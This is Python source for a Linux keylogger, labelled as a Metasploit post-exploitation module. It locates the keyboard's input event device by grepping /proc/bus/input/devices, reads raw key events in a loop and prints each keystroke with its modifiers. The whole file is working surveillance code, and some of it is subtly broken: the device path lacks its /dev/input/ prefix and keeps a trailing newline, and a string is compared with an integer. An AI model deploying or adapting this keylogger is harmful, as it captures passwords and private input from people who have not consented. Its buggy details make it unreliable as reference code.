# Metasploit Framework: keylogger module for Linux systems
# Credits: Eliott Teissonniere - Summer Of Code 2018

# One linered in post/linux/gather/keylogger.rb

import struct

from os import popen

# Find the right event file
infile_path = popen("grep -E  'Handlers|EV=' /proc/bus/input/devices | grep -B1 'EV=120013' | grep -Eo 'event[0-9]+'").read()

# English only ATM, if someone has a way to retrieve them with no privileges
# (dumpkeys is not a solution sadly), I am interested
keymaps = [
    "RESERVED",
    "ESC",
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "0",
    "MINUS",
    "EQUAL",
    "BACKSPACE",
    "TAB",
    "Q",
    "W",
    "E",
    "R",
    "T",
    "Y",
    "U",
    "I",
    "O",
    "P",
    "LEFTBRACE",
    "RIGHTBRACE",
    "ENTER",
    "LEFTCTRL",
    "A",
    "S",
    "D",
    "F",
    "G",
    "H",
    "J",
    "K",
    "L",
    "SEMICOLON",
    "APOSTROPHE",
    "GRAVE",
    "LEFTSHIFT",
    "BACKSLASH",
    "Z",
    "X",
    "C",
    "V",
    "B",
    "N",
    "M",
    "COMMA",
    "DOT",
    "SLASH",
    "RIGHTSHIFT",
    "KPASTERISK",
    "LEFTALT",
    "SPACE",
    "CAPSLOCK",
    "F1",
    "F2",
    "F3",
    "F4",
    "F5",
    "F6",
    "F7",
    "F8",
    "F9",
    "F10",
    "NUMLOCK",
    "SCROLLLOCK"
]

# Just for some pretty printing purposes
shift = False
modifiers = [
    "LEFTSHIFT",
    "RIGHTSHIFT",
    "LEFTCTRL",
    "LEFTALT"
]
pressed = []

#long int, long int, unsigned short, unsigned short, unsigned int
FORMAT = 'llHHI'
EVENT_SIZE = struct.calcsize(FORMAT)

#open file in binary mode
in_file = open(infile_path, "rb")

event = in_file.read(EVENT_SIZE)

while event:
    (tv_sec, tv_usec, type, code, value) = struct.unpack(FORMAT, event)

    if (type == 1) and (value == 1 or value == 0) :
        key = "unknown (%d)" % code
        if code < len(keymaps) and key >= 0:
            key = keymaps[code]

        if len(key) == 1 and value == 1:
            if not shift: key = key.lower()

            to_print = ""
            for modifier in pressed:
                to_print += modifier + " "
            print(to_print + key)
        elif key in modifiers:
            if value == 0:
                if key == "RIGHTSHIFT" or key == "LEFTSHIFT":
                    shift = False
                else:
                    pressed.remove(key)
            elif value == 1:
                if key == "RIGHTSHIFT" or key == "LEFTSHIFT":
                    shift = True
                else:
                    pressed.append(key)
        elif value == 0 and key not in modifiers and len(key) > 1:
            print(key)

    event = in_file.read(EVENT_SIZE)

in_file.close()
